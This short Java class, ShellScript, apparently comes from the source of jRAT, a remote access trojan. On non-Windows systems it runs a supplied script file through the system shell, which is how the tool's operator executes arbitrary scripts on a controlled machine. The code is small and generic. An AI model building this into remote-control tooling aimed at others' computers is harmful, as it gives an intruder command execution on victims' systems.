package se.jrat.common.script;

import java.io.File;

import com.redpois0n.oslib.OperatingSystem;
import com.redpois0n.oslib.Shell;

public class ShellScript extends Script {
	
	@Override
	protected void perform(File file) throws Exception {
		if (OperatingSystem.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
			Runtime.getRuntime().exec(new String[] { Shell.getShell().getPath(), file.getAbsolutePath() });
		}
	}

	@Override
	public String getExtension() {
		return "sh";
	}

}
